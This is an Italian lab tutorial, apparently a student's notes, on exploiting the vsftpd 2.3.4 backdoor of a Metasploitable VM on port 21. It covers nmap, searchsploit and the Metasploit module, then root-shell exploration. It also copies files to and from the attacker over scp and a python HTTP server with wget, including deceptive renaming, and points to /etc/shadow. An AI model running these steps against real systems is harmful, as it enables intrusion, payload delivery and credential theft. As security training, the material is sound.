# porta 21 ftp
ora che abbiamo ottenuto lo scan delle porte vulnerabili concentriamoci sulla porta numero 21 quella con il protocollo ftp e le vulnerabilità che la riguardano sfruttando i comandi di controllo per identificazione dei servizi collegati a quella porta in particolare

- sudo nmap -sV -p 21 [IP]
    - -p 21 indica di fare quel comando sulla porta (-p) con uno specifico numero (21)
    - -sV è l'opzione fondamentale poiche ora che sappiamo che la porta è aperta lanciamo la richiesta di invio pacchetti TCP e automaticamente stringhe di testo standard per protoclli diversi per cercar di indovinare marca e versione del servizio tramite le risposte ottenute

riceveremo un output come questo:

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
MAC Address: 08:00:27:62:23:8A (Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

dove viene indicata la porta il pacchetto utilizzato la tipologia di servizio la versione del servizio  e la tipologia di sistema operativo

il servizio ftp (file transfer protocol) è un protocollo vecchio che serve storicamente per caricare e scaricare file da un server. è un protocollo insicuro poiche trasmette password e dati in chiaro quindi non cifrati direttamente sulla rete pertanto se qualcuno intercettasse il traffico locale (sniffing) vedrebbe la password in pochi secondi

ora dobbiamo capire se ci sono vulnerabilità sfruttabili tramite esploit per farlo useremo il database offline di kali linux inserendo il comando 

- searchsploit [versione del servizio] = searchsploit vsftpd 2.3.4

l'output sarà qualcosa come :

┌──(kali㉿kali)-[~]
└─$ searchsploit vsftpd 2.3.4         
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                                                                    | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                       | unix/remote/17491.rb
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results


kali linux ha interrogato il database locale ed ha trovato due esploit pronti all'uso uno in linguaggio python (49757.py) ed un modulo integrato in metasploit che sarebbe il framework di attacco standard di kali linux (17491.rb) entrambi sfruttano una vulnerabilità nota che tramite l'autenticazione all'interno di quel servizio con un nome utente qualsiasi aggiungendo " :) " ( alessandro:) ) fa scattare un bug interno che apre una shell di comando con privilegi di root sulla porta 6200 il che significa che chiunque puo prendere controllo del sistema operativo senza nemmeno conoscere la password procediamo ora con capire e sfruttare la vulnerabilità

kali linux ha integrato di sistema il framework metasploit che sfrutteremo per entrare nella macchina bersaglio, facciamo partire il sistema per l'attacco con il comando:

- msfconsole

ora siamo nel framework e la linea di comando è cambiata da kali@kali = msf >

eseguiamo la ricerca del modulo per sfruttare la vulnerabilità con il comando :

- search vsftpd

ora dobbiamo utilizzare quell'esploit che ci esce fuori dall'outpu utilizzando il comando "use" e abbinandolo al percorse dell'esploit stesso che è stato identificato per funzionare l'esploit ha bisogno di due parametri in particolare RHOST e LHOST dove RHOST corrisponde all'ip della macchina bersaglio e LHOST all'ip della macchina attaccante settiamo questi due paratri con il comando "set RHOST" "set LHOST"

prima fase uso di un exploit specifico:
- use exploit/unix/ftp/vsftpd_234_backdoor
seconda fase set indirizzo ip della macchina vulnerabile:
- set RHOST [ip_macchina_vulnerabile]
terza fase set indirizzo ip attaccante:
- set LHOST [ip_macchina_attaccante]

se tutto è corretto ci trovero dentro la metaeploitable dentro a "meterpreter" un agente avanzato di metasploit con una sua lista di comandi diversa da linux ma possiamo utilizzare la linea di comando inserendo il comando "shell" aprendo una linea di comando vuota su cui poter scrivere. utilizziamo il comando :

- whoami

per sapere che tipologia di utente siamo e scopriremo di essere "root" cioè l'utente con privilegi amministrativi gia di fatto è una gravissima violazione ma andiamo oltre cosa possiamo fare con i privilegi amministrativi? prima cosa confrontiamo anche l'uid con il comando 
- id che ci restituisce l'id del nostro utente dove piu il numero è basso meno si è limitati  da restrizioni

risultato:
- UID=0 (root) permessimi con nessuna restrizione

ora utilizzando il comando "ls" avremo una lista tutto ciò che è all'interno del server su cui abbiamo effettuato l'accesso in quello specifico punto di partenza " / " per muoverci tra una directory e l'altra utilizziamo il comando " cd [nome_directory]" e " cd .. " per tornare alla directory precedente in ogni cartella possiamo utilizzare il comando "ls" o meglio ancora " ls -a" per mostrare i file nascosti " es. una cartela .hidden" per cercare file sensibili come password nomi utenti ecc.

fase ricognitiva:
- siamo entrati nella macchina vulnerabile esploriamo il suo contenuto tramite il comando:
    - ls -a per vedere una lista di file e cartelle anche nascoste
- spostiamoci nella cartella di nostro interesse tramite il comando :
    - cd [nome_directory] che ci permette di cambiare directory
- la cartella non risulta interessante? torniamo indietro
    - cd .. per tornare alla cartella precedente
- dobbiamo capire dove siamo finiti visti i tanti spostamenti
  - pwd ci mostra il percorso in cui ci troviamo in questo istante

se si volesse spostare un file dalla nostra macchina kali linux in una macchina vulnerabile che ha una porta ssh aperta senza entrare nella macchina vulnerabile direttamente dobbiamo usare il comando "scp" (secure copy protocol) indicando il comando , il percorso del file, e la macchinavirtualevulnerabile@[ip] indicando con " : " in seguito il percorso di destinazione

esempio per spostare un file chiamato "ciao.txt" salvato sul Desktop:
- scp ~/Desktop/ciao.txt msfadmin@192.168.56.101:/home
  - scp usa il protocollo sicuro per il trasferimento
  - ~/Desktop/ciao.txt è il percorso dove si trova il nostro file
  - msfadmin@192.168.56.101 è la macchina attaccata
  - : servono dividere una macchina dall'altra fungono da separatori per funzionalita 
  - /home è la destinazione in cui vogliamo far copiare il file

se invece volessi copiar eper me dei dati si invertono le posizioni in questo modo:
- scp msfadmin@192.168.56.101:/home/ciao.txt /Desktop/cartella_salvataggi
  - scp utilizza sempre il protocollo sicuro
  - msfadmin@192.168.56.101 è la macchina vulnerabile da cui vogliamo estrarre il file
  - : separano l'ip della macchina dal resto del comando
  - /home/ciao.txt è il file che vogliamo inviare
  - /Desktop/cartella_salvataggi è la destinazione

bisogna vviare nella cartella var/www/html il server http della porta 80 con il comando

- python3 -m http.server 80

creiamo il file che vogliamo inviare alla macchina vulnerabile in questa cartella specifica e successivamente facciamo la richiesta dalla macchina vulnerabile al nostro server

ora come nel nostro caso sono già all'itnerno della macchina virtuale possiamo operare direttamente tramite la shell di metaesploitable utilizzando i suoi comandi. se vogliamo spostare un file dal nostro server per metterlo dentro la metaesploitable possiamo usare il comando:
- wget http://[ip]/percorso/ciao.txt
  - cosi facendo la macchina vulnerabile manda una richiesta get al nostro server per ricevere quel file specifico
- wget http://[ip]/percorso/ciao.txt -O /percorso/dove/salvare/con/nuovo_nome.txt
  - -O (Output Document) utilizziamo quest'opzione per fare due eventi specifici
    - primo evento serve ad indicare di salvare il file in una cartella specifica
    - secondo evento serve per rinominare il file qualora si voglia mettere un nome piu ingannevole
-   wget http://[ip]/percorso/ciao.txt -P /percorso/dove/salvare/
    -   -P indica il prefix e si utilizza qualora non si voglia rinominare il file ma solo indicare la carella di destinazione


la cartella piu importante in un sistema linux è la cartella etc/ e versificare etc/shadow